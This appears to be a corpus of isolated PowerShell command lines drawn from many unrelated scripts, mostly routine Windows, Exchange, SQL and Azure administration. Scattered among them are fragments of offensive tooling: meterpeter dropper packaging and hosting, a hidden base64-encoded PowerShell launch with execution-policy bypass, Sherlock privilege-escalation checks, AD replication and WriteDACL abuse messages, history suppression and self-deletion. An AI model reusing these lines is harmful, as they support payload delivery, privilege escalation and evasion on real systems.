Register-EditorCommand ` -Name "Directories.OpenCloudDirEditor" ` -DisplayName "Open Cloud Storage Folder from List in Editor" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "PSAppDeployToolkit.OpenDevToolkitScript" ` -DisplayName "Open Dev Toolkit Script" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name 'PowerShellEditorServices.OpenEditorProfile' ` -DisplayName 'Open Editor Profile' ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "Directories.OpenFavDirEditor" ` -DisplayName "Open Favorite Folder from List in Editor" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "GithubProjects.OpenGithubRepo" ` -DisplayName "Open Github Repo in New Window" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "PSAppDeployToolkit.OpenToolkitDir" ` -DisplayName "Open Toolkit Directory" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "PSAppDeployToolkit.OpenToolkitScript" ` -DisplayName "Open Toolkit Script" ` -SuppressOutput ` -ScriptBlock {
Get-Service winrm | Start-Service
Get-VMHost | Sort-Object Name | Select Name , @{ N = "NTPServer" ; E = { $_ | Get-VMHostNtpServer } } , @{ N = "ServiceRunning" ; E = { ( Get-VMHostService -VMHost $_ | Where-Object { $_ . Key -eq "ntpd" } ) . Running } } | Format-Table -Autosize
Remove-Item $localpath 2> $null ;
X:\>setup /m:upgrade /IAcceptExchangeServerLicenseTerms_DiagnosticDataOFF
C:\>Set-ServerComponentState EX2016SRV1 –Component ServerWideOffline –State Active –Requester Maintenance
Set-Content -Value $query_MAPI $Outpath\query.txt -Force
Get-ChildItem -LiteralPath $Outpath -Filter query.txt | Remove-Item -Confirm: $false | Out-Null
Set-MailboxAutoReplyConfiguration -Identity Mailbox@consoto.com -AutoReplyState Enabled -InternalMessage "Enter Message Here" -ExternalMessage "Enter Message Here"
Add-Type -AssemblyName presentationframework , presentationcore
Connect-ExchangeOnline -UserPrincipalName $AdminAccount #Connects the user to Exchange Online using the email address provided. They will get a pop-up prompt for password and MFA where applicable.
Pester\Describe "Manifest" {
Install-Module PowerShellGet -MinimumVersion 1.6.6 -Force
New-Object PSObject -Property @{
Set-StrictMode -Version Latest
Get-PSSession |
Start-Sleep -Seconds $powerShellMaxCmdletsTimePeriodSeconds
Set-Content -Path $outZipFilePathName -Value ( "PK" + [ Char ] 5 + [ Char ] 6 + ( "$([Char]0)" * 18 ) ) -Force -WhatIf: $FALSE
Send-MailMessage ` -From $MailFrom ` -To $MailTo ` -SmtpServer $MailServer ` -Subject $messageSubject ` -Body 'See attached zipped Excel (CSV) spreadsheet.' ` -Attachments $outZipFilePathName
Remove-Item -LiteralPath $outZipFilePathName
Set-StrictMode -Version Latest
Get-Mailbox @getMailboxParameters |
Start-Sleep -Seconds $PowerShellMaxCmdletsTimePeriodSeconds
Clear-Variable -Name password1
Write-Progress -Activity "Getting global (PSReadLine) command history" -PercentComplete -1
Invoke-Pester ./Tests -Show $Show -PesterOption @{
New-Variable -Name WebDeployPort -Value 8172 -Option Constant
Set-AzureSubscription ` -SubscriptionName $currentSubscription . SubscriptionName ` -CurrentStorageAccountName $storageAccountName
Add-AzureSQLDatabase -DatabaseConfig $DatabaseConfig | Out-Null
Set-StrictMode -Version 3
Backup-Subscription -UserSpecifiedSubscription $SubscriptionName
Select-AzureSubscription -SubscriptionName $SubscriptionName | Out-Null
New-WebDeployPackage
Test-WebApplication
Import-Csv -header "FilePath" , "FileType" , "Version" tmpFileMagic.csv ` | ForEach-Object $_ ` {
robocopy.exe $resultsBasePath $dstPath $fileNamePath '/COPY:DAT'
Rename-Item tmpFilteredFiles.txt -Force
Start-Sleep -s 15 # let Solr come up
Start-Process notepad
Get-Process notepad
Stop-Process notepad
Get-Process notepad | Stop-Process
Start-Process notepad
Get-Process | Select-Object ProcessName
Get-Process | Select-Object Id
Get-Process | Select-Object Id , ProcessName
Get-Process svchost
Get-Service BITS
New-Item -Path "C:\Temp\Fundamentals2\" -ItemType Directory
Test-Connection www.google.com
Get-NetAdapter
Get-NetFirewallRule | Select-Object -First 1
Get-NetIPAddress
Get-Process -Name notepad
Get-Process -Name notepad -ErrorVariable 'noNotepad' -ErrorAction 'SilentlyContinue'
Clean-Memory
New-Item -ItemType Container $path | Out-Null
Get-AllInventoryTypes
Start-Sleep -Seconds 5
Invoke-RestMethod -Method Post -Body $bodyJson -Uri $link -ContentType 'application/json'
Measure-Command { 1 .. 10 | % { Get-ModulesList } } | Select TotalSeconds
Set-Content -Path ServersList_$TxtFileTemp.txt -Value "Enter your server names/IP addresses below this line, then save and close the file:"
Get-XAApplication * -ComputerName $broker | where { ( $_ . Enabled -eq $True ) -and ( $_ . CommandLineExecutable -like $SearchWord ) } | select browsername , CommandLineExecutable , WorkingDirectory | fl
Import-PSSolution -Name ClrSeed $scriptsRoot
Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/v$Version/nuget.exe" -OutFile $NuGetPath
Get-Service | Sort-Object { $_ . Name } | Where-Object { $_ . Status -eq "Running" } | Format-Table -Property *
Get-Service | Where-Object { $_ . Status -eq "Running" -and $_ . Name . Contains ( "Telligent" ) } | Format-List -Property *
Select-String "^.NET" | Select -Unique
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Import-Module -Force "$PSScriptRoot/module/UtilityModule"
Write-LogInfo "git pull-request $($args -join ' ')"
Show-Setting $subSetting
Show-Help
Clear-Logs
Add-Content -Path "$logFolder/log.log" -Value "[$logLevel][$now] $logTxt"
Set-ItemProperty NuGet.exe -Name IsReadOnly -Value $false
Export-ModuleMember -Alias * -Function Go* ;
New-PSRoleCapabilityFile -path ./RebootOnly.psrc
New-PSSessionConfigurationFile -path ./RebootOnly.pssc -full
Register-PSSessionConfiguration -Name "RebootOnly" -Path ./RebootOnly.pssc
Start-DscConfiguration -Path C:\DSC -Cimsession $session -wait -verbose
Find-Module nx
Install-WindowsFeature FS-Data-Deduplication -IncludeAllSubFeature
Enable-DedupVolume -Volume D: -UsageType Default
Set-DedupVolume -Volume D: -MinimumFileAgeDays 0
Start-DedupJob �Volume D: -Type Optimization -Memory 50
Invoke-Command -ScriptBlock {
New-SRPartnership -SourceComputerName server1 ` -SourceRGName RG1 ` -SourceVolumeName d: ` -SourceLogVolumeName e: ` -DestinationComputerName server2 ` -DestinationRGName RG2 ` -DestinationVolumeName d: ` -DestinationLogVolumeName e:
Get-SRGroup
Set-SRPartnership -NewSourceComputerName server2 ` -SourceRGName RG2 ` -DestinationComputerName server1 ` -DestinationRGName RG1
Get-SRPartnership
Get-SRPartnership | Remove-SRPartnership
Get-Job | Wait-Job | Receive-Job | Out-File -Append -FilePath $LogFile -Encoding ascii
Get-GW2APIValue -APIValue "characters/:id/backstory" @PSBoundParameters
New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ( [ array ] )
Start-Sleep -Seconds $RandNo . Next ( ( 1 - $Jitter ) * $Delay , ( 1 + $Jitter ) * $Delay )
Import-Csv -Path $userlist |
Import-Module "sqlps"
Get-ChildItem -path "E:\temp"
Send-EasyMail -subject "Test Subject" -body "Testing some body text."
Get-Counter -ComputerName $env:COMPUTERNAME -ListSet 'MSSQL$SQL2012*' |
Get-Counter -ListSet 'MSSQL$SQL2012:Buffer Manager' |
Get-WmiObject -ComputerName "PragmaticWorks" -Query $wmiQuery |
Get-EventLog -List
Get-WinEvent -ListLog * | Format-Table -Autosize
Get-EventLog System |
Get-EventLog Application -Newest 20 | Format-List
Get-EventLog Application |
New-EventLog -LogName Application -Source MyCoolPowerShellScript
Write-EventLog -LogName Application ` -Source MyCoolPowerShellScript ` -EventId 0001 ` -Message "I have something to say" ` -EntryType Information
Write-EventLog -LogName Application ` -Source MyCoolPowerShellScript ` -EventId 0002 ` -Message "You're doing it wrong" ` -EntryType Error
Write-EventLog -LogName Application ` -Source MyCoolPowerShellScript ` -EventId 0003 ` -Message "I'm The Doctor. Basically, run." ` -EntryType Warning
Set-Variable -scope Global -name SqlServerMaximumChildItems -Value 0
Update-TypeData -PrependPath $sqlpTypes
Get-PSProvider
Set-Location SQLSERVER:\
Set-Location SQLSERVER:\SQL
Set-Location SQLSERVER:\SQL\PORTHOS
Set-Location SQLSERVER:\SQL\PORTHOS\SQLEXPRESS
Set-Location $instance\Databases
Set-Location $instance\Databases\TestAdrian
Set-Location $instance\Databases\TestAdrian\Tables
Get-ChildItem "SQLSERVER:\SQL\$machine" |
Set-Location "SQLSERVER:\SQL\$machine"
Get-ChildItem SQLSERVER:\sql\$mi\databases
Get-ChildItem sqlserver:\sql\$mi\databases -Force
Get-ChildItem sqlserver:\sql\$mi\databases |
Get-Item SQLSERVER:\sql\$mi\databases\tempdb | Get-Member
Set-Location SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases\PSTest1
Set-Location SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases\PSTest1\Tables
New-PSDrive -Name PST1 ` -PSProvider SQLSERVER ` -Root SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases\PSTest1
Set-Location SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases\PSTest1
Invoke-Sqlcmd -Query $dbcmd -ServerInstance $env:COMPUTERNAME\SQL2012
Invoke-Sqlcmd -Query $dbcmd ` -ServerInstance $env:COMPUTERNAME\SQL2012 ` -Database "PSTEST1"
Set-Location SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases\PSTest1
Invoke-Sqlcmd -Query $dbcmd ` -ServerInstance $env:COMPUTERNAME\SQL2012 ` -SuppressProviderContextWarning
Set-Location SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases\PSTest1\Tables\dbo.SqlSaturday
Set-Location SQLSERVER:\sql\$env:COMPUTERNAME\SQL2012\databases
Invoke-Sqlcmd -Query $dbcmd ` -ServerInstance $env:COMPUTERNAME\SQL2012 ` -SuppressProviderContextWarning `
Get-Content "C:\PS\SQL Report.txt"
Unzip-File -File $NssmZip -Destination $NssmDir
Unzip-File -File $HttpListenerZip -Destination $HttpListenerDir
Get-Service -Name $ServiceName | Stop-Service
certutil.exe -verify $FilePath > $null
certutil.exe -addstore TrustedPeople $CertificatePath
Test-WSAPIConnection -WsapiConnection $WsapiConnection
Invoke-RepackageObjectWithType -RawObject $Response -ObjectName "Controller.$DeviceType"
Remove-item $remind_ngrok_process
Start-Process "$hostsPath1/mvps.bat" -verb runAs
Start-Process "http://localhost:4040" #track ngrok request
Start-Process "http://$ngrok_id.ngrok.com/wpmultisite/"
Start-BitsTransfer ` -Source $SourcePath ` -Destination $VHDCopy ` -Description "Copying `"$($SourcePath)`" to `"$($VHDCopy)`"" ` -DisplayName "Virtual Hard Disk Copy"
New-VM -Name $VMName ` -Path "$($Drive)\$($VMLocation)" ` -Generation $VHDGen ` -MemoryStartupBytes $VMRAM ` -VHDPath $VHDCopy
Get-Cluster | Select-Object Name , @{ Name = "IPAddress" ; Expression = { ( Get-ClusterNetwork | Where-Object { $_ . Role -eq "Cluster" } ) . Address } } , Domain , @{ Name = "NodeCount" ; Expression = { ( Get-ClusterNode ) . Count } }
Get-NetAdapter -CimSession < computername>
Get-ClusterNode | ForEach-Object { Get-NetLbfoTeam -CimSession $_ . Name }
Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force
Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force
Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
cscript.exe vbs_obfuscator.vbs Download_Crandle.vbs > Buffer.vbs
Compress-Archive -LiteralPath "$CrandleVbsName" -DestinationPath "$APACHE$Dropper_Name.zip" -Force
Remove-Item -Path "Buffer.vbs" -EA SilentlyContinue -force
Remove-Item -Path "$Bin$Dropper_Name.bat" -Force
Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;$PInterpreter -m http.server $HTTP_PORT --bind $Local_Host" ;
Start-Sleep -Seconds 1 ; $TriggerSettings = "$Local_Host" + ":" + "$Local_Port" -join ''
Expand-Archive ( Join-Path -Path $Destination -Childpath $FileOut ) -DestinationPath $Destination -Force
Remove-Item $TempFile
Export-ModuleMember -Function *
Set-AzureRmContext -SubscriptionID $ServicePrincipalConnection . SubscriptionId | Write-Verbose
Update-AzureRmVM -ResourceGroupName $VMResourceGroup -VM $VM -Tags $Tag | Write-Verbose
Invoke-RestMethod -Method "Post" -Uri $ChannelURL -Body $Body | Write-Verbose
Get-PSSession | Remove-PSSession
Get-AppxPackage -Name MicrosoftTeams | Remove-AppxPackage -ErrorAction stop
Start-Sleep -Milliseconds 100
Invoke-Expression -Command $HelperFunction
Remove-Item -Path $Path -Force
Set-Alias check Add-CheckTask
Set-BuildHeader {
Write-Build Green ( '=' * 140 )
Write-Build Green "Task $Path : $(Get-BuildSynopsis $Task)"
Write-Build Green "At $($Task.InvocationInfo.ScriptName):$($Task.InvocationInfo.ScriptLineNumber)"
Set-BuildFooter {
Write-Progress -Id $id -Activity 'Formatting Files' -PercentComplete ( [ math ] :: Floor ( ( $x / @( $files ) . Count ) ) * 100 ) -CurrentOperation "Formatted $($f.FullName)" -ErrorAction SilentlyContinue
Write-Build DarkGray '===InvokeBuild Invocation === '
Start-Sleep -Milliseconds $Timeout
Set-StrictMode -Version Latest
Add-Type -AssemblyName System.Web
Get-PackageProvider -Name NuGet -ForceBootstrap | Out-Null
Get-Item env:BH* | Remove-Item
Set-BuildEnvironment
Get-Date ( $Matches . Date + ' ' + $Matches . Time )
Get-ChildItem -Path $SourceRootPath -Filter *.ps1 -Recurse | ForEach-Object {
Export-ModuleMember -Function $PublicFunctionNames -Alias ( ( [ string [ ] ] $OfficialAliasExports . Keys ) )
Add-Member -InputObject $_ -MemberType NoteProperty -Name SizeKB -Value ( Convert-DockerSizeToPSSize -DockerSize $_ . Size )
Get-ChildItem -Path $ProjectRoot -Recurse | Where-Object { @( '.ps1' , '.psm1' ) -contains $_ . Extension -and $_ . DirectoryName -ne $ProjectRoot } | ForEach-Object {
Set-ModuleFunction @Verbose
Show-DosAsciiArt -Quiet: $script:quietWasSpecified
Show-DosHelpMenu
Remove-Item -Path Function:Write-Host
Get-ChildItem $userInputOptionValue -ErrorAction Stop | Out-Null
Start-Sleep -Milliseconds 1000
Get-ChildItem -Path $ModuleRoot\* -Exclude "Invoke-Forensics.ps1" -Filter *.ps1 | % { . $_ . FullName }
Add-Type -AssemblyName System.Windows.Forms
Invoke-ToIl
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
New-DirIfNotExist $cerpkgdir
Publish-Status "Creating $ProductName Product with BSP $BSPName"
Import-IoTOEMPackage "Security.$pkgname"
Publish-Status "---Adding OEM Certs---"
Add-SignerRule -CertificatePath $cert -FilePath $auditPolicy -update -kernel -user
Add-SignerRule -CertificatePath $cert -FilePath $auditPolicy -kernel -user
Set-RuleOption -FilePath $enforcedPolicy -Option 3 -Delete
Set-RuleOption -FilePath $enforcedPolicy -Option 6 -Delete
Set-RuleOption -FilePath $enforcedPolicy -Option 9 -Delete
Set-Location $filedir
Publish-Status "Exporting OEM FM files.."
Publish-Status "Processing OEMFMList.."
Remove-Item -Path $env:PKGBLD_DIR\*.spkg
Publish-Status "Validating product feature ids"
Publish-Status "Building product specific packages"
New-Item -ItemType Directory -Path $destinationDir | Out-Null
Copy-Item "$cepalPkgDir\*" -Destination $destinationDir -Recurse
Set-Location $env:IOTWKSPACE
New-Alias -Name 'buildfm' -Value 'New-IoTFIPPackage'
New-Alias -Name 'newappxpkg' -Value 'Add-IoTAppxPackage'
New-Alias -Name 'gpfidpkgs' -Value 'Get-IoTProductPackagesForFeature'
New-Alias -Name 'buildrecovery' -Value 'New-IoTRecoveryImage'
New-Alias -Name 'checkcab' -Value 'Test-IoTCabSignature'
New-Alias -Name 'new-ws' -Value 'New-IoTWorkspace'
New-Alias -Name 'importcepal' -Value 'Import-IoTCEPAL'
Set-Content -Path $diskpart_assign -Value "sel dis 0"
Add-Content -Path $setdrivecmd -Value "echo Setting $ParName Drive: DL_$ParName=C"
Add-Content -Path $diskpart_assign -Value "lis vol"
Publish-Status "Mounting $($this.FileName)"
Publish-Status "Removing drive letters"
Publish-Status "Extracting wims..."
Add-Type -AssemblyName System.IO.Compression.FileSystem
Publish-Status "Checking Microsoft features in OEMInput file.."
Publish-Status "Checking OEM features in OEMInput file.."
Publish-Error "$fmfile not found"
New-DirIfNotExist $cabpath
Publish-Status "Creating $bspdbcab"
Publish-Status "Signing $bspdbcab"
Publish-Status "Creating $ocpcab"
Publish-Status "Removing parent nodes"
New-DirIfNotExist $winpefiles -force
Publish-Status "Copying WinPE"
Publish-Status "Copying files into WinPE"
Set-Content -Path "$ffudir\RecoveryImageVersion.txt" -Value "$env:BSP_VERSION"
Publish-Status "Copying wim files from $ffudir"
Copy-Item "$winpewim" -Destination $mmosdir
Import-PfxCertificate -FilePath $pfxfile -CertStoreLocation Cert:\CurrentUser\My
Publish-Warning " $Name not signed with a cross signed cert. Signed with $ca"
New-Item $DirName -ItemType Directory | Out-Null
Write-CmdShortcut $DirName
Import-IoTOEMPackage Registry.Version
Set-IoTEnvironment
Set-IoTSignature
Remove-Item -Recurse -ErrorAction SilentlyContinue -Force $tempdir
Publish-Error "BSP copy failed"
Publish-Status "Creating workspace xml"
Move-Item -Path "$DirName\Tools" -Destination $todeletedir -Force
Publish-Status "Processing Products with temporary SMBIOS values"
Publish-Status "Processing provisioning packages"
Publish-Status "Processing driver packages"
Import-IoTCertificate $env:SAMPLEWKS\Certs\OEM-PK.cer PlatformKey
Import-IoTCertificate $env:SAMPLEWKS\Certs\OEM-DRA.cer DataRecoveryAgent
Import-IoTCertificate $env:SAMPLEWKS\Certs\OEM-PAUTH.cer Update
Add-IoTSecureBoot
Update-ModuleManifest -Path "$RootDir\Tools\IoTCoreImaging\IoTCoreImaging.psd1" -ModuleVersion "$ModuleVer"
Start-Sleep -Seconds 1
Write-DebugMessage -Message "[$($MyInvocation.MyCommand.Name)] LCNGVSSession: $($Script:LCNGVSSession | Out-String)"
Set-LCNGVSTimerEvent -Event $TimerEvent
Send-MailMessage -From $From -To $To -SmtpServer $Server -Body "$Body . Installed by: $UserID" -Subject $Subject -Credential $Cred -Encoding $encoding
Get-Help Get-Help
Get-Help Get-ADuser -Detailed
Get-Command -Noun ADUser
Get-ADuser mmarbut
Get-ADuser -Filter { SamAccountName -like "mmarbut" }
Get-ADuser -Filter { ( SamAccountName -like "*EBarber*" ) -AND ( Enabled -eq "False" ) }
Get-ADuser -filter *
Get-ADuser mmarbut | Select-Object Name
Get-Command -Noun ADuser
Get-ADGroup Role-Security
Add-ADGroupMember Role-Security mmarbut
Get-ADPrincipalGroupMembership Role-Security
Get-ADuser mmarbut | Get-ADObject
Set-ADUser mmarbut -Manager mmarbut -Title "Lead Administrator" -Add @{ Info = "Telephone Notes Section" ; ExtensionAttribute1 = "Human" }
Get-DbaDatabase -SqlInstance sqlinstance01\SQL01 -Database Database1
New-DbaLogin -SqlInstance sqlinstance01 -Login userlogin1
New-DbaDbUser -SqlInstance sqlinstance01\SQL01 -Login userlogin1 -Verbose
Add-DbaDbRoleMember -SqlInstance sqlinstance01 -Role "db_datareader" -User userlogin1 -WhatIf
Remove-DbaLogin -SqlInstance s-ihrdwhdb02aue.ihrcloud.net -Login userlogin1 -whatif
Remove-DbaDbUser -SqlInstance s-ihrdwhdb02aue.ihrcloud.net -User userlogin1
Get-WmiObject -computerName computerName1 Win32_Processor | Measure-Object -Property LoadPercentage -Average | Select Average
Start-BitsTransfer -Source 'file.txt' -Destination .
Remove-JS7Folder -Path $testFolder
Write-Status 'Removing files...'
Add-Type -AssemblyName System.DirectoryServices
Write-AddACEToFile
Write-Status 'Checking if we can bind to AD...'
Write-Status 'Finding Naming context for Configururation and Schema stores partitions...'
Start-Sleep $sleepInterval
Start-Sleep ( $sleepInterval )
Write-Status 'Adding ourself as potential replication partner...'
Write-Status "Retrieving groupmembership for user $($global:ldapConnInfo.username)..."
Write-Status "Getting schema classes..."
Write-Status "Getting extended rights from schema..."
Write-Good 'Got WriteDACL permissions.'
Start-sleep -Seconds 0.5
Add-Type -AssemblyName System.Web.Extensions
New-Item -ItemType Directory -Force -Path "C:\Istio"
Get-Service
get-service | where-Object Status -eq 'Stopped'
get-service | Where-Object Status -eq 'Stopped' | select-object Name , Status
get-verb | more
get-verb -Verb Set | more
get-verb -Verb Set | format-list
Get-Verb -Group Security | Format-List
get-service -Name M* -ComputerName Client01 , DC01
Get-Alias | More
get-alias -Definition *service*
get-command -verb New
get-command -name *IP* | More
invoke-history -id 24
Get-History | Out-File c:\scripts\transcripts\history.txt
Clear-History
Get-service | Select-Object Name , MachineName , Status
Get-Service -ComputerName Client01 , DC01 |
Get-NetFirewallRule -Name *Remote*
Get-NetFirewallRule -Name *RemoteDesktop* | Set-NetFirewallRule -Enabled 'True' -Whatif
Get-command *counter*
get-counter -ListSet Memory | Select -expand Counter
get-counter -Counter "\Memory\Pages /sec" , "\Memory\% Committed Bytes In Use" | FT
Get-WmiObject -List *
Get-Command get-NetIP*
Get-Command *SMB*
get-command get-*Event*
move-item c:\CopiedFolder -Destination c:\MovedFolder -verbose
Get-Service -computername DC01
Enter-PSSession -ComputerName DC01
Get-Service
Get-ChildItem ENV: | more
Get-Variable | More
Get-Variable -Name c*
Enter-PSSession -Id 1 # Enter value in console output.
Get-PSSession
Invoke-command -ComputerName $ComputerName -Credential $credential -ScriptBlock { get-service -ComputerName $ComputerName }
invoke-command -ComputerName $ComputerName -Credential $credential -ScriptBlock { get-service -ComputerName $using:ComputerName }
invoke-command -ComputerName DC01 -cred ( get-credential ) -ScriptBlock { Get-ADUser -Identity felixb | format-list }
Get-CimSession
Get-ExecutionPolicy
Get-Service -ComputerName LocalHost | Get-Member
Get-Service -ComputerName LocalHost | select-object -Property Name , Status
Get-Service -ComputerName LocalHost | where-object -Property status -eq "Stopped" | More
Get-Service -ComputerName LocalHost | where-object -Property status -eq "Stopped" | GM
get-service -ComputerName $Computername |
New-Item -ItemType File -Path .\NewFiles01\JustaFile.txt
Get-Command *copy*
Add-Type -TypeDefinition $source -Language CSharp
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Push-Location
Restart-Service -Name "Windows Update"
Get-Item -Path $registryPath | Remove-ItemProperty -Name 'GPRequestedSiteAssignmentCode' -Force -ErrorAction SilentlyContinue
Stop-Process -ProcessName Teams
remove-item -Path ( $screensaver_local_path + '*.*' )
copy-item -Path $screensaver_remote_path -Destination $screensaver_local_path
Export-ModuleMember -Function Write-ErrorLog , Write-VerboseLog , Write-WarningLog , Start-Log , Stop-Log
Add-Type -AssemblyName System.Windows.Forms
Export-ModuleMember -Function $PublicFunctions . basename
Export-ModuleMember -Variable *MdbCommand* -Function *Mdb*
Add-Type -AssemblyName 'System.Web'
convertto-securestring $MDTApiKey -asplaintext -force | ConvertFrom-SecureString | out-file $MDTKeyPath\$MDTClientId -force
Connect-MDTDatabase -sqlServer $MDTDatabaseServer -database $MDTDatabase | Out-Null
Invoke-Expression $MDTComputerSettings
Start-Polaris -Port 443 -MinRunspaces 1 -MaxRunspaces 5 -Https -HostName $MyServerName
Set-PSReadlineOption –HistorySaveStyle SaveNothing | Out-Null
Start-Sleep -Milliseconds $DelayTime
Start-Process -WindowStyle Maximized "$UrlLink" | Out-Null
Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
Start-Process diskmgmt.msc
Start-Process firewall.cpl
Start-Process appwiz.cpl
Remove-Item -Path "$WaveFile" -Force
Add-Type -TypeDefinition $setwallpapersrc
Remove-Item -LiteralPath $MyInvocation . MyCommand . Path -Force
Start-Sleep -Seconds 2
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null ;
Import-Module -Name "$Env:TMP\Sherlock.ps1" -Force ; Get-DllHijack ; Find-AllVulns
Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force
Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force
Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
Rename-Item -Path Download_Crandle.vbs -NewName $CrandleVbsName -Force
Compress-Archive -LiteralPath "$CrandleVbsName" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force
Remove-Item -Path "Buffer.vbs" -EA SilentlyContinue -force
Remove-Item -Path "$Bin$Dropper_Name.bat" -Force
Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;$PInterpreter -m http.server $HTTP_PORT --bind $Local_Host" ;
Start-Sleep -Seconds 1 ; $TriggerSettings = "$Local_Host" + ":" + "$Local_Port" -join ''
Remove-Item -Path "$Directory\$FolderName" -Recurse -Force
Install-Module Msonline -Force | Import-Module
connect-Msolservice
Get-Mailbox -Identity demouser@company.com | Select -ExpandProperty emailaddresses alias
Get-MsolUser -UserPrincipalName $NewuserName
Install-module msonline -Force | Import-Module
Get-Mailbox | select Name , Alias , UserPrincipalName , IsMailboxEnabled , Whenmailboxcreated | FL
Get-Mailbox
Get-MsolAccountSKU
Import-Module Msonline
Get-MsolAccountSKU
Connect-ExchangeOnline
Import-Module Msonline -Force -Verbose
Get-MsolUser -All -ReturnDeletedUsers | select UserPrincipalName , ObjectID
Remove-MsolUser -UserPrincipalName $UserPrincipalName -Force -RemoveFromRecycleBin
Remove-MsolUser -UserPrincipalName $UserPrincipalName -Force
Set-Mailbox -identity demouser@company.com -EmailAddresses @{ Remove = "demouseralias@company.com" }
Install-WindowsFeature RSAT-ADDS
New-Alias today Invoke-JournalToday
Get-MispConfiguration
Get-SavedMispEventList
Set-Location $env:SystemRoot # cange location before workflow
Test-PortAsynchronly -ComputerName $ComputerName -Port $Port |
Where-Object { ! [ string ] :: IsNullOrEmpty ( $_ ) } |
ForEach-Object {
Write-Progress -Activity $Message -Status $_ -PercentComplete $percent
Get-Resource -Url $url -FolderPath $FolderPath -Message $filename -ThrottleLimit $ThrottleLimit
Import-Module ActiveDirectory
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress "192.168.80.2" -PrefixLength 24 -DefaultGateway "192.168.80.1"
Set-TimeZone -Id "Central Europe Standard Time"
Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled True
Get-NetFirewallRule -DisplayGroup 'Network Discovery' | Set-NetFirewallRule -Profile 'Domain, Private, Public' -Enabled True
Rename-Computer -NewName "AD001" -Restart
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName mblabcloudtwo.onmicrosoft.com -InstallDns
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Start-Process $iisCmd " add site /name:$ApplicationName /id:10 /bindings:http/*:9000: /physicalPath:D:\$ApplicationName" -NoNewWindow -RedirectStandardError "Error.txt" -Wait
Start-Process $iisCmd " add apppool /name:$AppPoolName /managedRuntimeVersion:"""" /managedPipelineMode:Integrated" -NoNewWindow -RedirectStandardError "Error.txt" -Wait
Start-Process $msDeploy -NoNewWindow -ArgumentList $deployArgs -RedirectStandardError "Error.txt" #-RedirectStandardError "Error.txt" -RedirectStandardOutput $logfile -Wait
Remove-Variable app
Update-TypeData -TypeName "my.monitored.window" -DefaultDisplayPropertySet "Time" , "Application" , "WindowTitle" , "Product" -DefaultDisplayProperty WindowTitle -Force
Update-TypeData -TypeName "My.Monitored.Window" -MemberType AliasProperty -MemberName Title -Value WindowTitle -force
New-MySQLiteDBTable @NewTblParams
Add-Type -assembly System.Windows.Forms
start-sleep 5
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
Expand-Archive $zipfile -DestinationPath $Env:ProgramFiles -Force
Copy-Item $SourceFile -Destination $TargetFile
Test-ClusterPermissions -ServerObject $serverObject
Invoke-Query -ServerName $currentAvailabilityGroupReplicaServerObject . NetName -InstanceName $currentAvailabilityGroupReplicaServerObject . ServiceName -Database master -Query $restoreDatabaseQueryString -StatementTimeout 0
Add-SqlAvailabilityDatabase -InputObject $currentReplicaAvailabilityGroupObject -Database $databaseToAddToAvailabilityGroup
Remove-Item -Path $databaseFullBackupFile , $databaseLogBackupFile -Force -ErrorAction Continue
Restart-SqlService -ServerName $ServerName -InstanceName $InstanceName -Timeout $RestartTimeout
Assert-SqlLogin @PSBoundParameters
Assert-DatabaseAsymmetricKey @PSBoundParameters
Assert-DatabaseCertificate @PSBoundParameters
Test-SqlSecurityPrincipal -SqlServerObject $SqlServerObject -SecurityPrincipal $SecurityPrincipal
New-ObjectNotFoundException -Message $errorMessage
Set-Acl -Path $acl . Path -AclObject $acl . ACL
Import-SQLPSModule
Set-Variable -Scope 1 -Name $BindingVariable -Force -ErrorAction 'SilentlyContinue' -Value $valueToBind
New-WebAppPool -name $appPoolName -force
Import-Module $PSScriptRoot\lib\Frameworks\DotnetCore.psm1
Import-Module $PSScriptRoot\lib\Programs\ssms.setup.psm1
Write-VcsStatus
Set-Item Function:\prompt -Value $GitPromptScriptBlock
Start-Sleep -Seconds 2
start-sleep -m 25
export-modulemember -function New-NimInitiatorGroup
Start-Process -FilePath "$workd\jreInstall.exe" -ArgumentList INSTALLCFG="$workd\jreinstall.cfg"
Start-Sleep -s 180
